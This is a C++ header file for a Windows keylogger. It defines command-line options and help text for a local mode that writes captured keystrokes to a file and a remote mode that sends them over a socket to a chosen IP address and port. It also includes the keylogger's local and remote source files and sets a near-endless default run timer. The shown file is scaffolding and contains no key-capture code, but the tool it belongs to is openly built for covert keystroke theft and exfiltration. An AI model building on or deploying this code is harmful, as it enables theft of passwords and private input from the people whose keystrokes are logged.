#ifndef _MAIN_HPP_
#define _MAIN_HPP_

#include <winsock2.h> //SOCKET, etc
#include <iostream> //cout
#include <fstream> //ofstream
#include <getopt.h> //options
#include <chrono> //chrono

#define DEFAULT_VALUE_FILE_PATH "D:/temp.txt"


#define DEFAULT_VALUE_BUFFER_SIZE 50
#define DEFAULT_VALUE_TIMER 999999999

#define LONG_OPTION_LOCAL "local"
#define LONG_OPTION_REMOTE "remote"
#define LONG_OPTION_BUFFER_SIZE "buffer_size"
#define LONG_OPTION_NO_CLICK "no_click"
#define LONG_OPTION_ALPHABET_ONLY "alphabet_only"
#define LONG_OPTION_STORE_CHARACTER "store_character"
#define LONG_OPTION_TIMER "timer"
#define LONG_OPTION_HELP "help"

#define SHORT_OPTION_LOCAL 'l'
#define SHORT_OPTION_REMOTE 'r'
#define SHORT_OPTION_BUFFER_SIZE 'b'
#define SHORT_OPTION_NO_CLICK 'c'
#define SHORT_OPTION_ALPHABET_ONLY 'A'
#define SHORT_OPTION_STORE_CHARACTER 'C'
#define SHORT_OPTION_TIMER 't'
#define SHORT_OPTION_HELP 'h'

#define HELP_MESSAGE "Keylogger : "
#define HELP_MESSAGE_REQUIERED "\t[REQUIERED] Parameters : Please, choose one of them"
#define HELP_MESSAGE_LOCAL "\t\t-l | --local : local keylogger, store data into file on this computer, require 1 argument (destination path)"
#define HELP_MESSAGE_LOCAL_EXAMPLE "\t\t\tExample : ./bin/main.exe -l D:\\file.txt"
#define HELP_MESSAGE_REMOTE "\t\t-r | --remote : remote keylogger, send data via socket, require 2 arguments (ip, port)"
#define HELP_MESSAGE_REMOTE_EXAMPLE "\t\t\tExample : ./bin/main.exe -r 192.168.1.16 7777"
#define HELP_MESSAGE_OPTIONAL "\t[OPTIONAL] Options"
#define HELP_MESSAGE_BUFFER_SIZE "\t\t-b | --buffer_size : Buffer size before store data (file or socket) (DEFAULT : 50)"
#define HELP_MESSAGE_BUFFER_SIZE_EXAMPLE "\t\t\tExample : ./bin/main.exe ... -b 100"
#define HELP_MESSAGE_NO_CLICK "\t\t-c | --no_click : don't store click keys (based on ascii)"
#define HELP_MESSAGE_NO_CLICK_EXAMPLE "\t\t\tExample : ./bin/main.exe ... -c"
#define HELP_MESSAGE_ALPHABET_ONLY "\t\t-a | --alphabet_only : Store alphabet only, A-z (based on ascii)"
#define HELP_MESSAGE_ALPHABET_ONLY_EXAMPLE "\t\t\tExample : ./bin/main.exe ... -a"
#define HELP_MESSAGE_STORE_CHARACTER "\t\t-C | --store_character : Default store is int value, use this option if you want to store with character"
#define HELP_MESSAGE_STORE_CHARACTER_EXAMPLE "\t\t\tExample : ./bin/main.exe ... -C"
#define HELP_MESSAGE_TIMER "\t\t-t | --timer : How much time (second) before stop  keylogger (DEFAULT : 999999999)"
#define HELP_MESSAGE_TIMER_EXAMPLE "\t\t\tExample : ./bin/main.exe ... -t 500"
#define HELP_MESSAGE_HELP "\t\t-h | --help : print this help"
#define HELP_MESSAGE_HELP_EXAMPLE "\t\t\tExample : ./bin/main.exe -h"

#define ERROR_MESSAGE_SETCONTROLECTRLHANDLER "error SetConsoleCtrlHandler "

#define NO_ERROR 0

#include "./keylogger/keylogger.cpp"
#include "./keylogger/keylogger_local/keylogger_local.cpp"
#include "./keylogger/keylogger_remote/keylogger_remote.cpp"

extern string* g_file_path;

extern bool g_no_arrow;

extern bool g_no_click;

extern bool g_alphabet_only;

extern bool store_character;

extern size_t g_buffer_size;

extern keylogger* g_keylogger;

extern int g_timer;

/*
* Print all possible parameters of this program
*/
void print_help();

/*
* Initialize the keylogger with options
*/
void initialize_options(int, char**);

/*
* Main function
*/
int main(int, char**);

#endif
